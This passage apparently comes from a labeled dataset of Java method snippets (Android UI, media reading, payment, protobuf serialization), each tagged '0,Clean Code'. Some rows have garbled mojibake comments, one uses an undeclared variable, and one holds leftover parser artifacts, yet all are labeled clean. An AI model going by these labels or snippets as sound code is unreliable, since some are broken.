      mOnPageChangeListener=new TabLayoutOnPageChangeListener(this);
    }
    viewPager.addOnPageChangeListener(mOnPageChangeListener);
    mViewPagerSelectedListener=new ViewPagerOnTabSelectedListener(viewPager);
    addOnTabSelectedListener(mViewPagerSelectedListener);
    final PagerAdapter adapter=viewPager.getAdapter();
    if (adapter != null) {
      setPagerAdapter(adapter,useAdapterTitle,autoRefresh);
    }
    if (mAdapterChangeListener == null) {
      mAdapterChangeListener=new AdapterChangeListener(useAdapterTitle);
    }
    mAdapterChangeListener.setAutoRefresh(autoRefresh);
    viewPager.addOnAdapterChangeListener(mAdapterChangeListener);
  }
 else {
    mViewPager=null;
    setPagerAdapter(null,false,false);
  }
}
",0,Clean Code
"/** 
 * Updates the recognized text.
 */
public void updateRecognizedText(String stableText,String pendingText){
  if (DEBUG)   Log.d(TAG,""updateText("" + stableText + "",""+ pendingText+ "")"");
  if (stableText == null) {
    stableText="""";
  }
  SpannableStringBuilder displayText=new SpannableStringBuilder(stableText);
  if (DOTS_FOR_STABLE) {
    addDottySpans(displayText,stableText,0);
  }
  if (pendingText != null) {
    int pendingTextStart=displayText.length();
    displayText.append(pendingText);
    if (DOTS_FOR_PENDING) {
      addDottySpans(displayText,pendingText,pendingTextStart);
    }
 else {
      int pendingColor=getResources().getColor(R.color.lb_search_plate_hint_text_color);
      addColorSpan(displayText,pendingColor,pendingText,pendingTextStart);
    }
  }
  mStreamPosition=Math.max(stableText.length(),mStreamPosition);
  updateText(new SpannedString(displayText));
  if (ANIMATE_DOTS_FOR_PENDING) {
    startStreamAnimation();
  }
}
public void updateRecognizedText(String stableText,List<Float> rmsValues){
}",0,Clean Code
"/** 
 * 淇敼绾㈠寘
 * @param id
 * @param type
 * @param invite
 * @param maxRand
 * @param totalAmount
 * @param count
 * @param logoImage
 * @param bgImage
 * @param name
 * @param desc
 * @param expiredHours
 * @param state
 * @return
 */
@RequiresPermissions(""envelope:modify"") @PostMapping(""modify"") @AccessLog(module=AdminModule.REDENVELOPE,operation=""鏂板绾㈠寘淇℃伅RedEnvelopeController"") public MessageResult modifyRedEnvelope(@RequestParam(""id"") Long id,@RequestParam(value=""type"",required=false) Integer type,@RequestParam(value=""invite"",required=false) Integer invite,@RequestParam(value=""unit"",required=false) String unit,@RequestParam(value=""maxRand"",required=false) BigDecimal maxRand,@RequestParam(value=""totalAmount"",required=false) BigDecimal totalAmount,@RequestParam(value=""count"",required=false) Integer count,@RequestParam(value=""logoImage"",required=false) String logoImage,@RequestParam(value=""bgImage"",required=false) String bgImage,@RequestParam(value=""name"",required=false) String name,@RequestParam(value=""detail"",required=false) String detail,@RequestParam(value=""expiredHours"",required=false) Integer expiredHours,@RequestParam(value=""state"",required=false) Integer state){
  RedEnvelope redEnvelope=redEnveloperService.findOne(id);
  notNull(redEnvelope,""Validate Red Envelope!"");
  if (type != null)   redEnvelope.setType(type);
  if (invite != null)   redEnvelope.setInvite(invite);
  if (unit != null) {
    Coin coin=coinService.findByUnit(redEnvelope.getUnit());
    Assert.notNull(coin,""鏃犳晥鐨勫竵绉嶏紒"");
    redEnvelope.setUnit(unit);
  }
  ;
  if (maxRand != null)   redEnvelope.setMaxRand(maxRand);
  if (totalAmount != null)   redEnvelope.setTotalAmount(totalAmount);
  if (count != null)   redEnvelope.setCount(count);
  if (logoImage != null)   redEnvelope.setLogoImage(logoImage);
  if (bgImage != null)   redEnvelope.setBgImage(bgImage);
  if (name != null)   redEnvelope.setName(name);
  if (detail != null)   redEnvelope.setDetail(detail);
  if (expiredHours != null)   redEnvelope.setExpiredHours(expiredHours);
  if (state != null)   redEnvelope.setState(state);
  redEnvelope=redEnveloperService.save(redEnvelope);
  return MessageResult.getSuccessInstance(messageSource.getMessage(""SUCCESS""),redEnvelope);
}
",0,Clean Code
"@Override public CfLogisticsStorehouseExample getExampleByQuery(CfLogisticsStorehouseQuery cfLogisticsStorehouseQuery){
  CfLogisticsStorehouseExample cfLogisticsStorehouseExample=new CfLogisticsStorehouseExample();
  CfLogisticsStorehouseExample.Criteria criteria=cfLogisticsStorehouseExample.createCriteria();
  if (cfLogisticsStorehouseQuery.getIds() != null && cfLogisticsStorehouseQuery.getIds().size() > 0) {
    criteria.andIdIn(cfLogisticsStorehouseQuery.getIds());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehouseQuery.getStorehouseName())) {
    criteria.andStorehouseNameLike(""%"" + cfLogisticsStorehouseQuery.getStorehouseName() + ""%"");
  }
  if (cfLogisticsStorehouseQuery.getCountryId() != null) {
    criteria.andCountryIdEqualTo(cfLogisticsStorehouseQuery.getCountryId());
  }
  if (cfLogisticsStorehouseQuery.getProvinceId() != null) {
    criteria.andProvinceIdEqualTo(cfLogisticsStorehouseQuery.getProvinceId());
  }
  if (cfLogisticsStorehouseQuery.getStateOrCityId() != null) {
    criteria.andStateOrCityIdEqualTo(cfLogisticsStorehouseQuery.getStateOrCityId());
  }
  if (cfLogisticsStorehouseQuery.getZoneOrCountyId() != null) {
    criteria.andZoneOrCountyIdEqualTo(cfLogisticsStorehouseQuery.getZoneOrCountyId());
  }
  if (cfLogisticsStorehouseQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehouseQuery.getFactoryId());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehouseQuery.getOrderBy())) {
    cfLogisticsStorehouseExample.setOrderByClause(cfLogisticsStorehouseQuery.getOrderBy());
  }
  if (cfLogisticsStorehouseQuery.getPage() != null && cfLogisticsStorehouseQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehouseQuery.getPage(),cfLogisticsStorehouseQuery.getSize());
  }
  return cfLogisticsStorehouseExample;
}",0,Clean Code
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (data_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getData());
  }
  if (java.lang.Double.doubleToRawLongBits(baseRate_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(2,baseRate_);
  }
  if (java.lang.Double.doubleToRawLongBits(lambdaSqrt_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(3,lambdaSqrt_);
  }
  if (scaleShrinking_ != false) {
    size+=com.google.protobuf.CodedOutputStream.computeBoolSize(4,scaleShrinking_);
  }
  if (reproject_ != false) {
    size+=com.google.protobuf.CodedOutputStream.computeBoolSize(5,reproject_);
  }
  if (java.lang.Double.doubleToRawLongBits(squaredTwoNorm_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(6,squaredTwoNorm_);
  }
  if (iteration_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(7,iteration_);
  }
  if (java.lang.Double.doubleToRawLongBits(multiplier_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(8,multiplier_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",0,Clean Code
"/** 
 * Reads lines of text from the specified  {@link Reader}.
 * @param reader the reader to read lines from
 * @return a list containing the lines read. This list may be empty if there was no data to read.
 * @throws IOException if an IO error occurs.
 */
public static List<String> readLinesFromReader(final Reader reader) throws IOException {
  final BufferedReader br=new BufferedReader(reader);
  try {
    final List<String> lines=new ArrayList<String>();
    String line;
    while (true) {
      line=br.readLine();
      if (line == null) {
        return lines;
      }
      lines.add(line);
    }
  }
  finally {
    br.close();
  }
}
",0,Clean Code
"/** 
 * Clears the given key and associated item from the adapter.
 * @param key The key to be cleared.
 */
public void clear(int key){
  int index=mItems.indexOfKey(key);
  if (index >= 0) {
    mItems.removeAt(index);
    notifyItemRangeRemoved(index,1);
  }
}
/** 
 * Removes all items from this adapter, leaving it empty.
 */
public void clear(){
  final int itemCount=mItems.size();
  if (itemCount == 0) {
    return;
  }
  mItems.clear();
  notifyItemRangeRemoved(0,itemCount);
}",0,Clean Code
"/** 
 * <p>Gets the class name minus the package name for an  {@code Object}.</p>
 * @param object  the class to get the short name for, may be null
 * @param valueIfNull  the value to return if null
 * @return the class name of the object without the package name, or the null value
 */
public static String getShortClassName(Object object,String valueIfNull){
  if (object == null) {
    return valueIfNull;
  }
  return getShortClassName(object.getClass());
}
/** 
 * <p>Gets the class name minus the package name from a  {@code Class}.</p> <p>Consider using the Java 5 API  {@link Class#getSimpleName()} instead. The one known difference is that this code will return  {@code ""Map.Entry""} while the  {@code java.lang.Class} variant will simply return {@code ""Entry""}. </p>
 * @param cls  the class to get the short name for.
 * @return the class name without the package name or an empty string
 */
public static String getShortClassName(Class<?> cls){
  if (cls == null) {
    return StringUtils.EMPTY;
  }
  return getShortClassName(cls.getName());
}
/** 
 * <p>Gets the class name minus the package name from a String.</p> <p>The string passed in is assumed to be a class name - it is not checked.</p> <p>Note that this method differs from Class.getSimpleName() in that this will  return  {@code ""Map.Entry""} whilst the {@code java.lang.Class} variant will simply return  {@code ""Entry""}. </p>
 * @param className  the className to get the short name for
 * @return the class name of the class without the package name or an empty string
 */
public static String getShortClassName(String className){
  if (className == null) {
    return StringUtils.EMPTY;
  }
  if (className.length() == 0) {
    return StringUtils.EMPTY;
  }
  StringBuilder arrayPrefix=new StringBuilder();
  if (className.startsWith(""["")) {
    while (className.charAt(0) == '[') {
      className=className.substring(1);
      arrayPrefix.append(""[]"");
    }
    if (className.charAt(0) == 'L' && className.charAt(className.length() - 1) == ';') {
      className=className.substring(1,className.length() - 1);
    }
  }
  if (reverseAbbreviationMap.containsKey(className)) {
    className=reverseAbbreviationMap.get(className);
  }
  int lastDotIdx=className.lastIndexOf(PACKAGE_SEPARATOR_CHAR);
  int innerIdx=className.indexOf(INNER_CLASS_SEPARATOR_CHAR,lastDotIdx == -1 ? 0 : lastDotIdx + 1);
  String out=className.substring(lastDotIdx + 1);
  if (innerIdx != -1) {
    out=out.replace(INNER_CLASS_SEPARATOR_CHAR,PACKAGE_SEPARATOR_CHAR);
  }
  return out + arrayPrefix;
}",0,Clean Code
"ContainerInstance parse(DeploymentNodeDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  String containerIdentifier=tokens.get(IDENTIFIER_INDEX);
  Element element=context.getElement(containerIdentifier,Container.class);
  if (element == null) {
    throw new RuntimeException(""The container \"""" + containerIdentifier + ""\"" does not exist"");
  }
  DeploymentNode deploymentNode=context.getDeploymentNode();
  Set<String> deploymentGroups=new HashSet<>();
  if (tokens.includes(DEPLOYMENT_GROUPS_TOKEN)) {
    String token=tokens.get(DEPLOYMENT_GROUPS_TOKEN);
    String[] deploymentGroupReferences=token.split("","");
    for (    String deploymentGroupReference : deploymentGroupReferences) {
      Element e=context.getElement(deploymentGroupReference);
      if (e instanceof DeploymentGroup) {
        deploymentGroups.add(e.getName());
      }
    }
  }
  ContainerInstance containerInstance=deploymentNode.add((Container)element,deploymentGroups.toArray(new String[]{}));
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    containerInstance.addTags(tags.split("",""));
  }
  if (context.hasGroup()) {
    containerInstance.setGroup(context.getGroup().getName());
    context.getGroup().addElement(containerInstance);
  }
  return containerInstance;
}
",0,Clean Code
"public String toJson(Intent intent){
  if (intent == null) {
    return null;
  }
  JSONObject jsonObject=new JSONObject();
  try {
    Bundle extras=intent.getExtras();
    Set<String> keySet=extras.keySet();
    Iterator<String> iterator=keySet.iterator();
    while (iterator.hasNext()) {
      String next=iterator.next();
      Object value=extras.get(next);
      if (value instanceof Boolean) {
        jsonObject.put(next,(Boolean)value);
      }
 else       if (value instanceof Integer) {
        jsonObject.put(next,(Integer)value);
      }
 else       if (value instanceof Long) {
        jsonObject.put(next,(Long)value);
      }
 else       if (value instanceof Double) {
        jsonObject.put(next,(Double)value);
      }
 else       if (value instanceof String) {
        jsonObject.put(next,value);
      }
    }
  }
 catch (  JSONException e) {
    e.printStackTrace();
  }
  return jsonObject.toString();
}
",0,Clean Code
"@Override public int read(byte[] buffer,int offset,int readLength) throws HttpDataSourceException {
  Assertions.checkState(opened);
  if (readLength == 0) {
    return 0;
  }
 else   if (bytesRemaining == 0) {
    return C.RESULT_END_OF_INPUT;
  }
  if (readBuffer == null) {
    readBuffer=ByteBuffer.allocateDirect(READ_BUFFER_SIZE_BYTES);
    readBuffer.limit(0);
  }
  while (!readBuffer.hasRemaining()) {
    operation.close();
    readBuffer.clear();
    currentUrlRequest.read(readBuffer);
    try {
      if (!operation.block(readTimeoutMs)) {
        throw new SocketTimeoutException();
      }
    }
 catch (    InterruptedException e) {
      readBuffer=null;
      Thread.currentThread().interrupt();
      throw new HttpDataSourceException(new InterruptedIOException(e),currentDataSpec,HttpDataSourceException.TYPE_READ);
    }
catch (    SocketTimeoutException e) {
      readBuffer=null;
      throw new HttpDataSourceException(e,currentDataSpec,HttpDataSourceException.TYPE_READ);
    }
    if (exception != null) {
      throw new HttpDataSourceException(exception,currentDataSpec,HttpDataSourceException.TYPE_READ);
    }
 else     if (finished) {
      bytesRemaining=0;
      return C.RESULT_END_OF_INPUT;
    }
 else {
      readBuffer.flip();
      Assertions.checkState(readBuffer.hasRemaining());
      if (bytesToSkip > 0) {
        int bytesSkipped=(int)Math.min(readBuffer.remaining(),bytesToSkip);
        readBuffer.position(readBuffer.position() + bytesSkipped);
        bytesToSkip-=bytesSkipped;
      }
    }
  }
  int bytesRead=Math.min(readBuffer.remaining(),readLength);
  readBuffer.get(buffer,offset,bytesRead);
  if (bytesRemaining != C.LENGTH_UNSET) {
    bytesRemaining-=bytesRead;
  }
  bytesTransferred(bytesRead);
  return bytesRead;
}",0,Clean Code
"private void openFileSelector(boolean pcapng_format){
  boolean noFileDialog=false;
  String fname=Utils.getUniquePcapFileName(mCtx,pcapng_format);
  Intent intent=new Intent(Intent.ACTION_CREATE_DOCUMENT);
  intent.addCategory(Intent.CATEGORY_OPENABLE);
  intent.setType(""*/*"");
  intent.putExtra(Intent.EXTRA_TITLE,fname);
  if (Utils.supportsFileDialog(mCtx,intent)) {
    try {
      mPcapLauncher.launch(intent);
    }
 catch (    ActivityNotFoundException e) {
      noFileDialog=true;
    }
  }
 else   noFileDialog=true;
  if (noFileDialog) {
    Log.w(TAG,""No app found to handle file selection"");
    Utils.showToastLong(mCtx,R.string.no_activity_file_selection);
    mListener.onUriChecked(null);
  }
}
",0,Clean Code
"private void showPremiumBlockedToast(){
  if (isGroup) {
    if (boostsStatus != null && canApplyBoost != null) {
      LimitReachedBottomSheet.openBoostsForRemoveRestrictions(fragmentForLimit(),boostsStatus,canApplyBoost,dialogId,true);
      return;
    }
    if (storyViewer != null) {
      storyViewer.setOverlayVisible(true);
    }
    MessagesController.getInstance(currentAccount).getBoostsController().getBoostsStats(dialogId,boostsStatus -> {
      if (boostsStatus == null) {
        if (storyViewer != null) {
          storyViewer.setOverlayVisible(false);
        }
        return;
      }
      this.boostsStatus=boostsStatus;
      MessagesController.getInstance(currentAccount).getBoostsController().userCanBoostChannel(dialogId,boostsStatus,canApplyBoost -> {
        this.canApplyBoost=canApplyBoost;
        LimitReachedBottomSheet.openBoostsForRemoveRestrictions(fragmentForLimit(),boostsStatus,canApplyBoost,dialogId,true);
        if (storyViewer != null) {
          storyViewer.setOverlayVisible(false);
        }
      }
);
    }
);
    return;
  }
  AndroidUtilities.shakeViewSpring(chatActivityEnterView,shiftDp=-shiftDp);
  BotWebViewVibrationEffect.APP_ERROR.vibrate();
  String username="""";
  if (dialogId >= 0) {
    username=UserObject.getUserName(MessagesController.getInstance(currentAccount).getUser(dialogId));
  }
  Bulletin bulletin;
  if (MessagesController.getInstance(currentAccount).premiumFeaturesBlocked()) {
    bulletin=BulletinFactory.of(storyContainer,resourcesProvider).createSimpleBulletin(R.raw.star_premium_2,AndroidUtilities.replaceTags(LocaleController.formatString(R.string.UserBlockedRepliesNonPremium,username)));
  }
 else {
    bulletin=BulletinFactory.of(storyContainer,resourcesProvider).createSimpleBulletin(R.raw.star_premium_2,AndroidUtilities.replaceTags(LocaleController.formatString(R.string.UserBlockedRepliesNonPremium,username)),LocaleController.getString(R.string.UserBlockedNonPremiumButton),() -> {
      if (storyViewer != null) {
        storyViewer.presentFragment(new PremiumPreviewFragment(""noncontacts""));
      }
    }
);
  }
  bulletin.show();
}",0,Clean Code
"@NonNull public static String describeIntent(@NonNull Intent intent,String prefix){
  String action=intent.getAction();
  String data=intent.getDataString();
  String type=intent.getType();
  Set<String> categories=intent.getCategories();
  ComponentName cn=intent.getComponent();
  String packageName=intent.getPackage();
  int flags=intent.getFlags();
  Bundle extras=intent.getExtras();
  StringBuilder sb=new StringBuilder();
  if (action != null)   sb.append(prefix).append("" ACTION\t"").append(action).append(""\n"");
  if (data != null)   sb.append(prefix).append("" DATA\t"").append(data).append(""\n"");
  if (type != null)   sb.append(prefix).append("" TYPE\t"").append(type).append(""\n"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    String id=intent.getIdentifier();
    if (id != null)     sb.append(prefix).append("" IDENTIFIER\t"").append(id).append(""\n"");
  }
  if (categories != null) {
    for (    String category : categories) {
      sb.append(prefix).append("" CATEGORY\t"").append(category).append(""\n"");
    }
  }
  if (cn != null)   sb.append(prefix).append("" COMPONENT\t"").append(cn.flattenToString()).append(""\n"");
  if (packageName != null)   sb.append(prefix).append("" PACKAGE\t"").append(packageName).append(""\n"");
  if (flags != 0)   sb.append(prefix).append("" FLAGS\t0x"").append(Integer.toHexString(flags)).append(""\n"");
  if (extras != null) {
    for (    String key : extras.keySet()) {
      Pair<Integer,String> typeAndString=valueToParsableStringAndType(extras.get(key));
      if (typeAndString != null) {
        sb.append(prefix).append("" EXTRA\t"").append(key).append(""\t"").append(typeAndString.first);
        if (typeAndString.first != TYPE_NULL) {
          sb.append(""\t"").append(typeAndString.second);
        }
        sb.append(""\n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"MpMessageRespVO convert(MpMessageDO bean);
default MpMessageDO convert(WxMpXmlMessage wxMessage,MpAccountDO account,MpUserDO user){
  MpMessageDO message=convert(wxMessage);
  if (account != null) {
    message.setAccountId(account.getId()).setAppId(account.getAppId());
  }
  if (user != null) {
    message.setUserId(user.getId()).setOpenid(user.getOpenid());
  }
  return message;
}
@Mappings(value={@Mapping(source=""msgType"",target=""type""),@Mapping(target=""createTime"",ignore=true)}) MpMessageDO convert(WxMpXmlMessage bean);
!org.eclipse.jdt.core.dom.MethodDeclaration@5f4429f8!org.eclipse.jdt.core.dom.MethodDeclaration@7ed6b587default MpMessageDO convert(WxMpKefuMessage wxMessage,MpAccountDO account,MpUserDO user){
  MpMessageDO message=convert(wxMessage);
  if (account != null) {
    message.setAccountId(account.getId()).setAppId(account.getAppId());
  }
  if (user != null) {
    message.setUserId(user.getId()).setOpenid(user.getOpenid());
  }
  return message;
}
@Mappings(value={@Mapping(source=""msgType"",target=""type""),@Mapping(target=""createTime"",ignore=true)}) MpMessageDO convert(WxMpKefuMessage bean);",0,Clean Code
"/** 
 * Check if proxy setting is configured and is being used by app.
 * @return Whether the proxy is being used, i.e. system properties are configured according to proxy settings.
 */
@RequiresApi(api=Build.VERSION_CODES.KITKAT) public boolean isProxyConfigured(){
  if (mProxy == null || mProxy.type() == Proxy.Type.DIRECT) {
    return System.getProperty(""http.proxyHost"") == null && System.getProperty(""https.proxyHost"") == null && System.getProperty(""socksProxyHost"") == null;
  }
  PasswdInetSocketAddress proxyAddr=(PasswdInetSocketAddress)mProxy.address();
  String proxyHost=proxyAddr.getHostString();
  String proxyPort=Integer.toString(proxyAddr.getPort());
switch (mProxy.type()) {
case HTTP:
    return proxyHost.equals(System.getProperty(""http.proxyHost"")) && proxyPort.equals(System.getProperty(""http.proxyPort"")) && proxyHost.equals(System.getProperty(""https.proxyHost""))&& proxyPort.equals(System.getProperty(""https.proxyPort""));
case SOCKS:
  return proxyHost.equals(System.getProperty(""socksProxyHost"")) && proxyPort.equals(System.getProperty(""socksProxyPort""));
}
return false;
}
",0,Clean Code
"public void layoutViews(ConversationInfo conversation,int position){
  currentConversation=conversation;
  if (showFoldedStyle && conversation.isMarkFold()) {
    titleText.setText(R.string.folded_group_chat);
    timelineText.setVisibility(View.GONE);
    foldGroupNameTv.setVisibility(View.VISIBLE);
    foldGroupNameDivider.setVisibility(View.VISIBLE);
    foldGroupNameTv.setText(conversation.getTitle());
  }
 else {
    titleText.setText(conversation.getTitle());
    foldGroupNameTv.setVisibility(View.GONE);
    foldGroupNameDivider.setVisibility(View.GONE);
  }
  messageText.setText("""");
  timelineText.setText("""");
  setLastMessageAndStatus(conversation);
  if (!mAdapter.hasItemUnreadDot()) {
    unreadText.setVisibility(View.GONE);
  }
  conversationIconView.setShowFoldedStyle(showFoldedStyle);
  conversationIconView.setConversation(conversation);
  if (conversation.isShowDisturbIcon() && !isForwardMode) {
    if (showFoldedStyle && conversation.isMarkFold()) {
      disturbView.setVisibility(View.GONE);
    }
 else {
      disturbView.setVisibility(View.VISIBLE);
    }
  }
 else {
    disturbView.setVisibility(View.GONE);
  }
  if (conversation.isMarkStar() && !isForwardMode) {
    if (showFoldedStyle && conversation.isMarkFold()) {
      markBannerView.setVisibility(View.GONE);
    }
 else {
      markBannerView.setVisibility(View.VISIBLE);
      timelineText.setVisibility(View.GONE);
    }
  }
 else {
    markBannerView.setVisibility(View.GONE);
    timelineText.setVisibility(View.VISIBLE);
  }
  if (isForwardMode) {
    messageText.setVisibility(View.GONE);
    timelineText.setVisibility(View.GONE);
    unreadText.setVisibility(View.GONE);
    messageStatusLayout.setVisibility(View.GONE);
    messageFailed.setVisibility(View.GONE);
    messageSending.setVisibility(View.GONE);
    atAllTv.setVisibility(View.GONE);
    atMeTv.setVisibility(View.GONE);
    draftTv.setVisibility(View.GONE);
    riskTv.setVisibility(View.GONE);
  }
  if (!conversation.isGroup() && TUIConversationConfigClassic.isShowUserOnlineStatusIcon()) {
    userStatusView.setVisibility(View.VISIBLE);
    if (conversation.getStatusType() == ConversationInfo.USER_STATUS_ONLINE) {
      userStatusView.setBackgroundResource(TUIThemeManager.getAttrResId(rootView.getContext(),com.tencent.qcloud.tuikit.timcommon.R.attr.user_status_online));
    }
 else {
      userStatusView.setBackgroundResource(TUIThemeManager.getAttrResId(rootView.getContext(),com.tencent.qcloud.tuikit.timcommon.R.attr.user_status_offline));
    }
  }
 else {
    userStatusView.setVisibility(View.GONE);
  }
  applyCustomConfig();
}
",0,Clean Code
"/** 
 * Obtain the client IP
 * @param request
 * @return
 */
public static String getClientIp(HttpRequest request){
  HttpHeaders httpHeaders=request.getHeaders();
  String ip;
  for (  String header : CLIENT_IP_HEADERS) {
    ip=httpHeaders.getFirst(header);
    if (!NetUtil.isUnknown(ip)) {
      return NetUtil.getMultistageReverseProxyIp(ip);
    }
  }
  ip=request.getRemote();
  return NetUtil.getMultistageReverseProxyIp(ip);
}
",0,Clean Code
"public static void updateLayoutGravityOf(final View view,final int layoutGravity){
  final ViewGroup.LayoutParams lp=view.getLayoutParams();
  if (lp instanceof LinearLayout.LayoutParams) {
    if (params.gravity != layoutGravity) {
      params.gravity=layoutGravity;
      view.setLayoutParams(params);
    }
  }
 else   if (lp instanceof FrameLayout.LayoutParams) {
    if (params.gravity != layoutGravity) {
      params.gravity=layoutGravity;
      view.setLayoutParams(params);
    }
  }
 else {
    throw new IllegalArgumentException(""Layout parameter doesn't have gravity: "" + lp.getClass().getName());
  }
}
",0,Clean Code
"public static void delete(DatabaseProvider databaseProvider,long uid) throws DatabaseIOException {
  delete(databaseProvider,Long.toHexString(uid));
}
@Override public void delete() throws DatabaseIOException {
  delete(databaseProvider,hexUid);
}
private static void delete(DatabaseProvider databaseProvider,String hexUid) throws DatabaseIOException {
  try {
    String tableName=getTableName(hexUid);
    SQLiteDatabase writableDatabase=databaseProvider.getWritableDatabase();
    writableDatabase.beginTransaction();
    try {
      VersionTable.removeVersion(writableDatabase,VersionTable.FEATURE_CACHE_CONTENT_METADATA,hexUid);
      dropTable(writableDatabase,tableName);
      writableDatabase.setTransactionSuccessful();
    }
  finally {
      writableDatabase.endTransaction();
    }
  }
 catch (  SQLException e) {
    throw new DatabaseIOException(e);
  }
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)8);
    output.writeUInt32NoTag(mapId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)74);
    output.writeMessageNoTag(curRoom);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.mapId,mapId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.curRoom,curRoom);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * 鎶婃爲鑺傜偣鍒楄〃鏋勯�犳垚鏍戯紝鏈�鍚庤繑鍥炴爲鐨勬牴鑺傜偣锛屽鏋滀紶鍏ョ殑鍒楄〃鏈夊涓牴鑺傜偣锛屼細鍔ㄦ�佸垱寤轰竴涓牴鑺傜偣銆�
 * @param nodes 鏍戣妭鐐瑰垪琛�
 * @return 鏍硅妭鐐�
 */
public static <T>TreeNode<T> buildTree(List<TreeNode<T>> nodes){
  if (nodes == null || nodes.size() == 0) {
    return null;
  }
  if (nodes.size() == 1) {
    TreeNode<T> root;
    root=new TreeNode<T>();
    root.setLeaf(false);
    root.setId(""-1"");
    root.setName(""root"");
    root.setParentId("""");
    root.getChildren().addAll(nodes);
    return root;
  }
  List<TreeNode<T>> tops=new ArrayList<TreeNode<T>>();
  boolean hasParent=false;
  for (  TreeNode<T> child : nodes) {
    hasParent=false;
    String pid=child.getParentId();
    if (pid == null || """".equals(pid)) {
      tops.add(child);
      continue;
    }
    for (    TreeNode<T> parent : nodes) {
      String id=parent.getId();
      if (id != null && id.equals(pid)) {
        parent.getChildren().add(child);
        parent.setLeaf(false);
        hasParent=true;
        continue;
      }
    }
    if (!hasParent) {
      tops.add(child);
    }
  }
  TreeNode<T> root;
  if (tops.size() == 1) {
    root=tops.get(0);
  }
 else {
    root=new TreeNode<T>();
    root.setLeaf(false);
    root.setId(""-1"");
    root.setName(""root"");
    root.setParentId("""");
    root.getChildren().addAll(tops);
  }
  return root;
}",0,Clean Code
"/** 
 * Computes a percentile by integration.
 * @param percentile The desired percentile, expressed as a fraction in the range (0,1].
 * @return The requested percentile value or {@link Float#NaN} if no samples have been added.
 */
public float getPercentile(float percentile){
  ensureSortedByValue();
  float desiredWeight=percentile * totalWeight;
  int accumulatedWeight=0;
  for (int i=0; i < samples.size(); i++) {
    Sample currentSample=samples.get(i);
    accumulatedWeight+=currentSample.weight;
    if (accumulatedWeight >= desiredWeight) {
      return currentSample.value;
    }
  }
  return samples.isEmpty() ? Float.NaN : samples.get(samples.size() - 1).value;
}",0,Clean Code
"private void updateOrderExtensionClosed(PayChannelDO channel,PayOrderRespDTO notify){
  PayOrderExtensionDO orderExtension=orderExtensionMapper.selectByNo(notify.getOutTradeNo());
  if (orderExtension == null) {
    throw exception(PAY_ORDER_EXTENSION_NOT_FOUND);
  }
  if (PayOrderStatusEnum.isClosed(orderExtension.getStatus())) {
    log.info(""[updateOrderExtensionClosed][orderExtension({}) 宸茬粡鏄敮浠樺叧闂紝鏃犻渶鏇存柊]"",orderExtension.getId());
    return;
  }
  if (PayOrderStatusEnum.isSuccess(orderExtension.getStatus())) {
    log.info(""[updateOrderExtensionClosed][orderExtension({}) 鏄凡鏀粯锛屾棤闇鏇存柊涓烘敮浠樺叧闂璢"",orderExtension.getId());
    return;
  }
  if (ObjectUtil.notEqual(orderExtension.getStatus(),PayOrderStatusEnum.WAITING.getStatus())) {
    throw exception(PAY_ORDER_EXTENSION_STATUS_IS_NOT_WAITING);
  }
  int updateCounts=orderExtensionMapper.updateByIdAndStatus(orderExtension.getId(),orderExtension.getStatus(),PayOrderExtensionDO.builder().status(PayOrderStatusEnum.CLOSED.getStatus()).channelNotifyData(toJsonString(notify)).channelErrorCode(notify.getChannelErrorCode()).channelErrorMsg(notify.getChannelErrorMsg()).build());
  if (updateCounts == 0) {
    throw exception(PAY_ORDER_EXTENSION_STATUS_IS_NOT_WAITING);
  }
  log.info(""[updateOrderExtensionClosed][orderExtension({}) 鏇存柊涓烘敮浠樺叧闂璢"",orderExtension.getId());
}",0,Clean Code
"private String formatNameFromMime(final String mimeType){
switch (mimeType) {
case MimeTypes.AUDIO_DTS:
    return ""DTS"";
case MimeTypes.AUDIO_DTS_HD:
  return ""DTS-HD"";
case MimeTypes.AUDIO_DTS_EXPRESS:
return ""DTS Express"";
case MimeTypes.AUDIO_TRUEHD:
return ""TrueHD"";
case MimeTypes.AUDIO_AC3:
return ""AC-3"";
case MimeTypes.AUDIO_E_AC3:
return ""E-AC-3"";
case MimeTypes.AUDIO_E_AC3_JOC:
return ""E-AC-3-JOC"";
case MimeTypes.AUDIO_AC4:
return ""AC-4"";
case MimeTypes.AUDIO_AAC:
return ""AAC"";
case MimeTypes.AUDIO_MPEG:
return ""MP3"";
case MimeTypes.AUDIO_MPEG_L2:
return ""MP2"";
case MimeTypes.AUDIO_VORBIS:
return ""Vorbis"";
case MimeTypes.AUDIO_OPUS:
return ""Opus"";
case MimeTypes.AUDIO_FLAC:
return ""FLAC"";
case MimeTypes.AUDIO_ALAC:
return ""ALAC"";
case MimeTypes.AUDIO_WAV:
return ""WAV"";
case MimeTypes.AUDIO_AMR:
return ""AMR"";
case MimeTypes.AUDIO_AMR_NB:
